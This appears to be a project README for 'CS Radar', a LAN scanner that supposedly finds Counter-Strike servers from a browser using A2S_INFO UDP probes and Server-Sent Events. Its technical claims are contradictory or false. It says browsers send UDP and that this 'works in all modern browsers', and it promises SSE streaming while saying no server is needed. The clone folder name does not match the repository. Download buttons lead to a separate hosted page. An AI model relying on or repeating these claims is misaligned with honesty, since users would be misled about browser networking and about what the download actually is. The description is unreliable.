# CS Radar v1.0 - LAN Scanner 2026

> **A browser-driven LAN scanner that actively checks your local network for Counter-Strike servers with A2S_INFO queries, then streams discoveries in real time through Server-Sent Events.** It is designed to help players and administrators locate active Counter-Strike servers on a local network without doing manual port sweeps.

[![Platform](https://img.shields.io/badge/Platform-Web-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-v1.0-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/gabe-cooper/cs-radar-lan-scanner?style=flat-square)](https://github.com/gabe-cooper/cs-radar-lan-scanner)

---

<p align="center">
  <a href="https://gabe-cooper.github.io/cs-radar-lan-scanner/">
    <img src="https://img.shields.io/badge/Download-CS%20Radar%20Latest-brightgreen?style=for-the-badge" alt="Download CS Radar">
  </a>
</p>

> **[Direct Download - CS Radar v1.0](https://gabe-cooper.github.io/cs-radar-lan-scanner/)**

---

[Download Latest Build](https://gabe-cooper.github.io/cs-radar-lan-scanner/)

---

## What CS Radar Does

CS Radar turns a web browser into a focused network discovery utility for Counter-Strike server detection. Rather than depending on static listings or manual IP lookups, it sends active UDP probes across your local subnet and reads A2S_INFO replies to identify live game servers. The output is a continuously refreshed view of Counter-Strike instances on the network, including details such as player counts, map names, and game version.

It fits LAN event organizers, competitive players, and network admins who need a fast way to find game servers without installing extra software. The retro terminal look, along with the animated radar favicon, gives the interface a distinct style while keeping the workflow practical. CS Radar also manages scan concurrency carefully so discovery stays responsive without putting unnecessary load on the network.

---

## Key Capabilities

- **Active UDP Scanning** - Uses A2S_INFO requests to probe the local network and discover Counter-Strike servers
- **Real-Time Results via SSE** - Server-Sent Events stream updates as soon as servers are detected
- **Automatic Game Version Detection** - Determines which Counter-Strike version each server is running
- **Manual IP Query** - Query a chosen IP address directly for server information
- **Concurrency-Controlled Scanning** - Configurable scan pacing helps avoid network congestion
- **Server Info Display** - Presents player counts, map, hostname, and game type
- **Copy-to-Connect** - Copy server connection strings with a single click
- **Animated Radar Favicon** - Tab icon feedback changes while scanning is in progress
- **Retro Terminal UI** - Green-on-black interface with a functional classic layout

---

## Installation

CS Radar is a client-side web app and does not require a build step.

```bash
git clone https://github.com/gabe-cooper/cs-radar-lan-scanner.git
cd CSRadar-LAN-Scanner
```

Open `index.html` in any modern web browser. No server or dependencies needed.

---

## How to Use It

1. **Begin Scanning** - Click the "Scan" button to start probing your local network
2. **Monitor Results** - Watch servers appear live as they are discovered
3. **Search the List** - Use the search bar to narrow results by server name or IP
4. **Connect** - Use the copy icon next to a server to copy its connection string
5. **Manual Query** - Type an IP address into the manual query field for a targeted check

Example workflow:
- Launch CS Radar in your browser
- Press "Scan" to start network discovery
- Wait for results to populate (typically 5-30 seconds depending on network size)
- Click a server to view detailed information
- Use "Copy to Connect" to paste the address into your game client

---

## Configuration

All preferences are saved in browser local storage and remain available between sessions. You can adjust these options from the settings panel:

- **Scan Range** - Define the IP range to scan (default: your local subnet)
- **Concurrency Level** - Number of simultaneous probes (1-50, default: 10)
- **Timeout** - Milliseconds to wait for server responses (default: 2000ms)
- **Port Range** - UDP ports to check (default: 27015-27020)

---

## Requirements

- **Platform** - Any modern web browser (Chrome, Firefox, Edge, Safari)
- **Runtime** - No server required; runs entirely client-side
- **Network** - Local network access for UDP scanning
- **Storage** - Minimal; settings stored in browser local storage
- **Permissions** - Browser must allow UDP connections (works in all modern browsers)

---

## FAQ

**Q: Does CS Radar work on external networks?**
A: No, it is intended for local network scanning only and will not probe external IPs or the internet.

**Q: Can I scan for other games?**
A: The tool is tuned for Counter-Strike's A2S_INFO protocol, but it may also detect other Source-engine servers on the same network.

**Q: How do I update the scanner?**
A: Download the latest release from the repository and replace your current files. No data migration is needed.

**Q: Why are some servers not showing up?**
A: Make sure the servers are running and that your firewall permits UDP traffic on the scanned ports. Some routers may block multicast discovery.

**Q: Is there a command-line version?**
A: CS Radar is browser-only right now, though the scanning logic could be adapted for CLI use in a future release.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
